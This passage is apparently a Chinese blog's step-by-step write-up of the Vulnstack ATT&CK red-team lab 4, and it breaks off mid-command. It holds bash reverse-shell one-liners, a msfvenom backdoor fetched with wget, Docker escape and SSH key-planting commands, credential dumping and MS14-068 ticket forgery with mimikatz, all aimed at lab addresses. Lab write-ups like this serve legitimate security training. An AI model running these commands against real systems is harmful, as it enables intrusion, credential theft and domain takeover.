History和administrator域管理员的sid相同</p>\n<p>那么现在我们的whoami用户便拥有了administrator域管理员的权限，并可以用该用户随时登录域控主机。</p>\n<hr>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://mp.weixin.qq.com/s/TZikwC9vrWQOXJjUnJkqXg\">红队评估 ATT&amp;CK-02</a></p>\n<p><a href=\"https://blog.csdn.net/Zlirving_/article/details/112724273\">ATT&amp;CK实战系列（二）琢磨篇</a></p>\n<p><a href=\"https://blog.csdn.net/weixin_44155363/article/details/107734481\">ATT&amp;CK实战系列二（CS域渗透）</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s/mp1XEwhiP0X_Iemfyvqb9A\">实战 ｜ 记一次Vulnstack靶场内网渗透（三）</a></p>\n","categories":["渗透"]},{"title":"ATT&CK红队评估实战靶场（四）","url":"/2023/12/25/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E5%9B%9B%EF%BC%89/","content":"<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412203633962.png\"></p>\n<p>地址：<a href=\"http://vulnstack.qiyuanxuetang.net/vuln/detail/6/\">vulnstack</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">1.st漏洞利用               2.phpmyadmin 4.8.1文件包含  </span><br><span class=\"line\">3.tomcat getshell         4.docker逃逸 ssh 免密登录   </span><br><span class=\"line\">5.ms14-068 域提权漏洞  \t  6.bash 一句话反弹shell     </span><br><span class=\"line\">7.sc 服务计划任务           8.token 降权收集信息</span><br></pre></td></tr></table></figure>\n\n<a id=\"more\"></a>\n\n<h1 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h1><p>账号信息：</p>\n<blockquote>\n<p>ubuntu:   ubuntu<br>win7  douser: Dotest123<br>DC:  administrator: Test2008  修改为Qwer1234</p>\n</blockquote>\n<p>下载完三个压缩包解压后，虚拟机导入.ovf文件:</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412184052874.png\"></p>\n<p>切换root身份，开启docker：</p>\n<blockquote>\n<p>docker-compose up -d</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412184142703.png\" alt=\"在这里插入图片描述\"><br>查看运行情况：</p>\n<blockquote>\n<p>ps</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2021041218440845.png\"><br>IP信息：</p>\n<blockquote>\n<p>DC<br>IP：192.168.183.130 内网<br>OS：Windows 2008</p>\n</blockquote>\n<blockquote>\n<p>Win7<br>Ip: 192.168.183.128 内网</p>\n</blockquote>\n<blockquote>\n<p>Ubuntu<br>Ip：192.168.47.136  外网<br>Ip：192.168.183.129  内网</p>\n</blockquote>\n<hr>\n<h1 id=\"外网渗透\"><a href=\"#外网渗透\" class=\"headerlink\" title=\"外网渗透\"></a>外网渗透</h1><h2 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h2><blockquote>\n<p>nmap -T4 -sV  192.168.47.136 </p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412184801429.png\" alt=\"在这里插入图片描述\"></p>\n<p>查询得到对应服务：</p>\n<blockquote>\n<p>2001：struts2<br>2002：Tomcat  (version:8.5.19)<br>2003：phpmyadmin</p>\n</blockquote>\n<hr>\n<h2 id=\"2001：st2漏洞\"><a href=\"#2001：st2漏洞\" class=\"headerlink\" title=\"2001：st2漏洞\"></a>2001：st2漏洞</h2><p>正好ctfshow刚做过java，直接利用工具</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412184927275.png\"></p>\n<hr>\n<h2 id=\"2002-Tomcat\"><a href=\"#2002-Tomcat\" class=\"headerlink\" title=\"2002:Tomcat\"></a>2002:Tomcat</h2><p>搜索漏洞</p>\n<blockquote>\n<p>searchsploit tomcat 8.5.19</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412185111431.png\"><br>复制到桌面</p>\n<blockquote>\n<p>searchsploit -m /usr/share/exploitdb/exploits/jsp/webapps/42966.py</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412185128493.png\"></p>\n<p>漏洞检测：</p>\n<blockquote>\n<p>python 42966.py -u <a href=\"http://192.168.47.136:2002/\">http://192.168.47.136:2002/</a></p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412185145940.png\"><br>存在漏洞且上传了一个测试文件：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412185157347.png\"><br>获取webshell：</p>\n<blockquote>\n<p>python 42966.py -u <a href=\"http://192.168.47.136:2002/\">http://192.168.47.136:2002/</a> -p pwn </p>\n</blockquote>\n<p>其实就是生成<code>pwn.jsp</code>后门可以直接去执行：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412185239374.png\"><br>或者</p>\n<p>Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）</p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/137686820\">Tomcat漏洞汇总</a></p>\n<p>访问抓包：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412185433484.png\"><br>修改为<code>PUT</code>方法，上传冰蝎shell1.jsp<br>回显<code>201</code>为成功：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2021041218551667.png\"><br>冰蝎连接：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412185536918.png\"></p>\n<hr>\n<h2 id=\"PhpMyAdmin（4-8-1文件包含漏洞）\"><a href=\"#PhpMyAdmin（4-8-1文件包含漏洞）\" class=\"headerlink\" title=\"PhpMyAdmin（4.8.1文件包含漏洞）\"></a>PhpMyAdmin（4.8.1文件包含漏洞）</h2><p><a href=\"https://blog.csdn.net/weixin_39190897/article/details/99078864\">渗透测试-PhpMyAdmin后台文件包含漏洞</a></p>\n<p>版本4.8.1：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412185748235.png\"><br>上来先试一下写入一句话，开启全局日志写路径getshell，返回权限错误</p>\n<p>找到phpmyadmin 4.8.1 (CVE-2018-12613)</p>\n<p>测试漏洞 访问：</p>\n<blockquote>\n<p>/index.php?target=db_sql.php?/../../../../../../../../etc/passwd</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412185838805.png\"><br>原理：</p>\n<blockquote>\n<p>每次登录phpmyadmin系统的时候，系统就会产生一个 <code>sess_sessionID</code> 文件，然后在里面执行的操作，会被记录到这个文件内（UNIX系统中存放路径为 <code>/tmp/sess_[当前会话session值]）</code>。</p>\n</blockquote>\n<p>利用：<br>执行 <code>select &#39; &lt;?php phpinfo() ?&gt;</code> 命令，查看当前页面 cookie值：<code>phpMyAdmin:cookie</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412185938487.png\"></p>\n<p>访问</p>\n<blockquote>\n<p><a href=\"http://192.168.47.136:2003/?target=db_sql.php%253f/../../../../../../../../tmp/sess_87d042e299d54975eef6411cd90dd80c\">http://192.168.47.136:2003/?target=db_sql.php%253f/../../../../../../../../tmp/sess_87d042e299d54975eef6411cd90dd80c</a></p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412190237546.png\"><br>成功执行，返回写入一句话即可利用，但是我这里没有成功</p>\n<hr>\n<h1 id=\"反弹Docker-shell\"><a href=\"#反弹Docker-shell\" class=\"headerlink\" title=\"反弹Docker shell\"></a>反弹Docker shell</h1><h2 id=\"判断Docker环境\"><a href=\"#判断Docker环境\" class=\"headerlink\" title=\"判断Docker环境\"></a>判断Docker环境</h2><p>实战中首先需要判断服务器是否为docker环境。</p>\n<p>常用的判断方法有两种。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">是否存在.dockerenv文件:</span><br><span class=\"line\">docker环境下存在：ls -alh &#x2F;.dockerenv 文件</span><br><span class=\"line\"></span><br><span class=\"line\">查询系统进程的cgroup信息:</span><br><span class=\"line\">docker环境下 cat &#x2F;proc&#x2F;1&#x2F;cgroup</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412190752927.png\"></p>\n<hr>\n<h2 id=\"bash-一句话\"><a href=\"#bash-一句话\" class=\"headerlink\" title=\"bash 一句话\"></a>bash 一句话</h2><p><a href=\"https://blog.csdn.net/weixin_43221560/article/details/112436499\">bash 反弹shell 一句话原理</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.47.128&#x2F;9999 0&gt;&amp;1</span><br><span class=\"line\"></span><br><span class=\"line\">bash -i &gt; &#x2F;dev&#x2F;tcp&#x2F;192.168.47.128&#x2F;9999 2&gt;&amp;1 0&gt;&amp;1</span><br><span class=\"line\"></span><br><span class=\"line\">bash -i &lt; &#x2F;dev&#x2F;tcp&#x2F;192.168.47.128&#x2F;9999 2&gt;&amp;0 1&gt;&amp;0</span><br></pre></td></tr></table></figure>\n\n<p>bash一句话生成shell.sh</p>\n<p>冰蝎上传 shell.sh </p>\n<p>Kali开启监听，同时运行shell.sh</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">chmod +x shell.sh   &#x2F;&#x2F;添加可执行</span><br><span class=\"line\">bash shell.sh     &#x2F;&#x2F;运行</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412191024124.png\"></p>\n<hr>\n<h2 id=\"冰蝎反弹shell\"><a href=\"#冰蝎反弹shell\" class=\"headerlink\" title=\"冰蝎反弹shell\"></a>冰蝎反弹shell</h2><p>看图</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412191049861.png\"></p>\n<hr>\n<h2 id=\"msfvenom-后门\"><a href=\"#msfvenom-后门\" class=\"headerlink\" title=\"msfvenom 后门\"></a>msfvenom 后门</h2><p>生成msf马：</p>\n<blockquote>\n<p>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.47.128 LPORT=8888 -f elf &gt;shell.elf</p>\n</blockquote>\n<p>这里可以冰蝎直接上传，运行，我试试另外一种</p>\n<p>使用python在当前目录开一个简单的http服务 默认端口8000：</p>\n<blockquote>\n<p>python -m SimpleHTTPServer </p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412191223251.png\"><br>访问网站看看我自己的kali桌面：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412191239547.png\"><br>利用之前那个pwn.jsp</p>\n<blockquote>\n<p>wget <a href=\"http://192.168.47.128:8000/shell.elf\">http://192.168.47.128:8000/shell.elf</a>  //主动下载后门马</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412191333768.png\"></p>\n<blockquote>\n<p>chmod 777 shell.elf  //赋予权限<br>./shell.elf   //运行</p>\n</blockquote>\n<p>kali开启监听 记得切换payload：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412191504278.png\"><br>至此有三个shell</p>\n<ol>\n<li>   bash一句话</li>\n<li>   冰蝎java shell</li>\n<li>   Msf木马的linux shell</li>\n</ol>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412191528322.png\"></p>\n<hr>\n<h1 id=\"Docker-逃逸\"><a href=\"#Docker-逃逸\" class=\"headerlink\" title=\"Docker 逃逸\"></a>Docker 逃逸</h1><p><a href=\"https://www.freebuf.com/articles/container/242763.html\">初始docker逃逸</a></p>\n<h2 id=\"CVE-2019-5736逃逸-失败\"><a href=\"#CVE-2019-5736逃逸-失败\" class=\"headerlink\" title=\"CVE-2019-5736逃逸(失败)\"></a>CVE-2019-5736逃逸(失败)</h2><p><a href=\"https://blog.csdn.net/lhh134/article/details/104107776\">docker逃逸漏洞复现（CVE-2019-5736）</a></p>\n<blockquote>\n<p>Docker、containerd或者其他基于 runc 的容器在运行时存在安全漏洞，攻击者可以通过特定的容器镜像或者exec操作获取到宿主机  <code>runc</code> 执行时的文件句柄并<code>修改掉runc的二进制文件</code>，从而获取到宿主机的 root 执行权限。</p>\n</blockquote>\n<p>影响版本：<br>Docker version &lt; 18.09.2<br>RunC version &lt;= 1.0-rc6</p>\n<p>恶意容器需要满足以下两个条件之一：</p>\n<p>1· 有一个攻击者控制的恶意镜像创建<br>2· 攻击者具有某已存在容器的写权限，且可通过docker exec进入</p>\n<hr>\n<p>Poc地址：<a href=\"https://github.com/Frichetten/CVE-2019-5736-PoC\">https://github.com/Frichetten/CVE-2019-5736-PoC</a></p>\n<p>下载后修改payload为bash一句话 反弹shell：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412192054608.png\"><br>编译生成payload：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">source &#x2F;etc&#x2F;profile   &#x2F;&#x2F;配置go环境</span><br><span class=\"line\"></span><br><span class=\"line\">CGO_ENABLED&#x3D;0 GOOS&#x3D;linux GOARCH&#x3D;amd64 go build main.go  &#x2F;&#x2F;编译生成</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2021041219224023.png\"><br>上传main：</p>\n<p>可以使用冰蝎，也可以使用msf会话上传，且需要赋予权限</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">upload &#x2F;home&#x2F;cys121&#x2F;桌面&#x2F;CVE-2019-5736-PoC&#x2F;main &#x2F;home</span><br><span class=\"line\"></span><br><span class=\"line\">chmod 777 &#x2F;home&#x2F;main</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412192354586.png\"><br> 执行payload，同时 nc 监听7777</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">.&#x2F;main   &#x2F;&#x2F;运行payload</span><br><span class=\"line\">nc -lvp 7777  &#x2F;&#x2F;监听</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2021041219245798.png\"><br>payload需要重启docker才可以触发：模拟重启容器：</p>\n<blockquote>\n<p>docker exec -it 09dd4e5bfa91 /bin/bash</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412192700543.png\"><br>Payload执行成功：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412192710307.png\"><br>但是并没有反弹shell</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412192725201.png\"><br>如果成功：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412192739465.png\"></p>\n<hr>\n<h2 id=\"特权模式—privileged-ssh-免密码-逃逸\"><a href=\"#特权模式—privileged-ssh-免密码-逃逸\" class=\"headerlink\" title=\"特权模式—privileged+ssh 免密码 逃逸\"></a>特权模式—privileged+ssh 免密码 逃逸</h2><blockquote>\n<p>特权模式于版本0.6时被引入Docker，允许容器内的root拥有外部物理机root权限，而此前容器内root用户仅拥有外部物理机普通用户权限。<br>使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行docker run —privileged时，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载。<br>当控制使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。</p>\n</blockquote>\n<h3 id=\"挂载目录\"><a href=\"#挂载目录\" class=\"headerlink\" title=\"挂载目录\"></a>挂载目录</h3><p>查看磁盘文件:</p>\n<blockquote>\n<p>fdisk -l</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412192851941.png\"><br>可以看到 <code>sda1</code> 在<code>/dev/sda1</code></p>\n<p>新建一个目录,将/dev/vda1挂载至新建的目录</p>\n<blockquote>\n<p>mkdir /cyshack  //新建目录<br>mount /dev/sda1 /cyshack   //挂载到新目录</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412192955829.png\"><br>查看是否挂载成功：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//202104121930180.png\"><br>到此挂载成功，我们可以通过这个目录来访问宿主机的目录</p>\n<p>查看当前用户：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412193130908.png\"></p>\n<hr>\n<h3 id=\"生成秘钥\"><a href=\"#生成秘钥\" class=\"headerlink\" title=\"生成秘钥\"></a>生成秘钥</h3><p>这时在攻击机本地生成 <code>ssh秘钥文件</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ssh-keygen -f cyshack  </span><br><span class=\"line\"></span><br><span class=\"line\">chmod 600 cyshack  &#x2F;&#x2F;对cyshack赋权，只有拥有者有读写权限。</span><br></pre></td></tr></table></figure>\n\n<p>就会生成一个秘钥文件：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412193324848.png\"><br><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412193333112.png\"></p>\n<hr>\n<h3 id=\"写入秘钥\"><a href=\"#写入秘钥\" class=\"headerlink\" title=\"写入秘钥\"></a>写入秘钥</h3><p>接下来将生成的秘钥写入目标机</p>\n<blockquote>\n<p>ls /cyshack/home/ubuntu -l -a  //利用的就是这个.ssh目录</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412193613854.png\"><br><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412193625981.png\"><br>将 ssh秘钥 写入到.ssh目录里面并将文件命名为<code>authorized_keys</code> (目标机<code>.ssh目录权限为700</code>)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">cp -avx &#x2F;cyshack&#x2F;home&#x2F;ubuntu&#x2F;.ssh&#x2F;id_rsa.pub &#x2F;cyshack&#x2F;home&#x2F;ubuntu&#x2F;.ssh&#x2F;authorized_keys </span><br><span class=\"line\">&#x2F;&#x2F; -avx 将权限也一起复制</span><br><span class=\"line\"></span><br><span class=\"line\">echo &gt; authorized_keys  &#x2F;&#x2F;将内容清空</span><br><span class=\"line\"></span><br><span class=\"line\">echo ‘kali生成的.pub内容’ &gt; authorized_keys  &#x2F;&#x2F;将ssh秘钥写入</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412193853420.png\"><br><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412193903604.png\"></p>\n<hr>\n<h3 id=\"免密登录\"><a href=\"#免密登录\" class=\"headerlink\" title=\"免密登录\"></a>免密登录</h3><p>此时，可以利用自己的私钥进行免密码登录目标宿主机</p>\n<blockquote>\n<p>ssh -i cyshack <a href=\"mailto:&#117;&#98;&#x75;&#x6e;&#116;&#117;&#64;&#49;&#57;&#50;&#46;&#49;&#x36;&#x38;&#x2e;&#52;&#x37;&#46;&#49;&#51;&#x36;\">&#117;&#98;&#x75;&#x6e;&#116;&#117;&#64;&#49;&#57;&#50;&#46;&#49;&#x36;&#x38;&#x2e;&#52;&#x37;&#46;&#49;&#51;&#x36;</a></p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//202104121940194.png\"></p>\n<hr>\n<h1 id=\"反弹宿主机权限到MSF\"><a href=\"#反弹宿主机权限到MSF\" class=\"headerlink\" title=\"反弹宿主机权限到MSF\"></a>反弹宿主机权限到MSF</h1><p>还是可以用wget进行下载木马，在msf设置监听获取meterpreter</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">python -m SimpleHTTPServer &#x2F;&#x2F;启动web服务</span><br><span class=\"line\"></span><br><span class=\"line\">wget http:&#x2F;&#x2F;192.168.47.128:8000&#x2F;shell.elf</span><br><span class=\"line\"></span><br><span class=\"line\">Chmod 777 shell.elf   &#x2F;&#x2F;权限</span><br><span class=\"line\"></span><br><span class=\"line\">.&#x2F;shell.elf     &#x2F;&#x2F;执行</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412194353396.png\"><br><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412194459671.png\"></p>\n<hr>\n<h1 id=\"攻入内网\"><a href=\"#攻入内网\" class=\"headerlink\" title=\"攻入内网\"></a>攻入内网</h1><h2 id=\"ubuntu添加路由代理\"><a href=\"#ubuntu添加路由代理\" class=\"headerlink\" title=\"ubuntu添加路由代理\"></a>ubuntu添加路由代理</h2><p>ip a ：发现另一个网段</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412194706787.png\"></p>\n<p>添加路由：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2021041219473598.png\"></p>\n<hr>\n<h2 id=\"内网扫描\"><a href=\"#内网扫描\" class=\"headerlink\" title=\"内网扫描\"></a>内网扫描</h2><p>用ms17_010扫描</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412194855287.png\"><br>看到一台win7 192.168.183.128,  一台win2008 192.168.183.130</p>\n<hr>\n<h2 id=\"获取win7\"><a href=\"#获取win7\" class=\"headerlink\" title=\"获取win7\"></a>获取win7</h2><p>用永恒之蓝打<br>关键是这里：<br><code>setg Proxies socks5:192.168.47.136:1080</code></p>\n<p>不这样设置，永恒之蓝打不进去</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412195005738.png\"></p>\n<hr>\n<h1 id=\"内网信息收集\"><a href=\"#内网信息收集\" class=\"headerlink\" title=\"内网信息收集\"></a>内网信息收集</h1><h2 id=\"token-降权\"><a href=\"#token-降权\" class=\"headerlink\" title=\"token 降权\"></a>token 降权</h2><p>为了方便信息收集，将当前权限<code>降为普通域用户</code>，因为不是域用户没有权限执行域命令</p>\n<p><a href=\"https://blog.csdn.net/qq_41874930/article/details/111926058\">通过token窃取实现降权或者提权</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">getuid &#x2F;&#x2F;查看当前token</span><br><span class=\"line\">use incognito &#x2F;&#x2F;加载incognito</span><br><span class=\"line\">list_tokens -u &#x2F;&#x2F;列出accesstoken</span><br><span class=\"line\">impersonate_token &quot;DEMO\\douser&quot;  &#x2F;&#x2F;模拟&quot;DEMO\\douser”用户</span><br><span class=\"line\">rev2self  &#x2F;&#x2F;返回之前的accesstoken权限</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412195147240.png\"></p>\n<hr>\n<h2 id=\"信息收集-1\"><a href=\"#信息收集-1\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h2><p>降权</p>\n<p>网卡信息：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//202104121952486.png\"><br>查看几个域：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412195350855.png\"><br>域内机器：<br><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412195458790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70\">域控列表：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412195543542.png\"><br>域内用户：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412195626575.png\"><br>域管列表：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412195642223.png\"><br>域控ip：</p>\n<p>192.168.183.130</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412195653963.png\"><br>密码收集：</p>\n<p>提权</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">load kiwi</span><br><span class=\"line\">creds_all</span><br><span class=\"line\">得到域用户   douser：Dotest123</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h1 id=\"进攻域控\"><a href=\"#进攻域控\" class=\"headerlink\" title=\"进攻域控\"></a>进攻域控</h1><h2 id=\"ms17-010\"><a href=\"#ms17-010\" class=\"headerlink\" title=\"ms17-010\"></a>ms17-010</h2><p>失败</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412195946803.png\"></p>\n<hr>\n<h2 id=\"ms14-068\"><a href=\"#ms14-068\" class=\"headerlink\" title=\"ms14-068\"></a>ms14-068</h2><p><a href=\"https://www.freebuf.com/vuls/56081.html\">深入解读MS14-068漏洞：微软精心策划的后门？</a></p>\n<p><a href=\"https://www.cnblogs.com/yuzly/p/10859520.html\">MS14-068域提权漏洞复现</a></p>\n<hr>\n<p>一、<strong>system权限上传mimikatz.exe</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412200213160.png\"></p>\n<hr>\n<p>二、<strong>获取域用户douser的sid</strong></p>\n<blockquote>\n<p>whoami /user</p>\n</blockquote>\n<p>demo\\douser S-1-5-21-979886063-1111900045-1414766810-1107</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412200244935.png\"></p>\n<hr>\n<p>三、<strong>伪造生成票据</strong></p>\n<p>上传ms14-068.exe (github)，生成TGT票据</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">MS14-068.exe -u douser@DEMO.com -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130 -p Dotest123</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; ms14-068.exe -u 域成员名@域名.com -s 域成员sid -d 域控制器ip地址 -p 域成员密码</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2021041220062910.png\"><br>如图成功生成票据文件<code>TGT_douser@DEMO.com.ccache</code></p>\n<hr>\n<p>四、<strong>导入票据</strong></p>\n<blockquote>\n<p>利用mimikatz注入票据，将票据伪造到当前内存中，伪造凭证，如果成功则拥有域管理权限，可任意访问域中所有机器</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">kerberos::purge &#x2F;&#x2F;清空当前机器中所有凭证</span><br><span class=\"line\">kerberos::list  &#x2F;&#x2F;查看当前机器凭证</span><br><span class=\"line\">kerberos::ptc TGT_douser@DEMO.com.ccache &#x2F;&#x2F;将票据注入到内存中</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//202104122009004.png\"><br>查看是否注入成功：</p>\n<blockquote>\n<p>klist</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412200929984.png\"></p>\n<hr>\n<p>五、<strong>访问域控</strong></p>\n<blockquote>\n<p>dir \\WIN-ENS2VR5TR3N\\c$  //查看域控机器c盘</p>\n</blockquote>\n<p>如果是ip则不能访问</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412201056720.png\"></p>\n<hr>\n<h1 id=\"获取域控权限\"><a href=\"#获取域控权限\" class=\"headerlink\" title=\"获取域控权限\"></a>获取域控权限</h1><h2 id=\"sc服务关闭防火墙\"><a href=\"#sc服务关闭防火墙\" class=\"headerlink\" title=\"sc服务关闭防火墙\"></a>sc服务关闭防火墙</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">sc \\\\WIN-ENS2VR5TR3N create unablefirewall binpath&#x3D; &quot;netsh advfirewall set 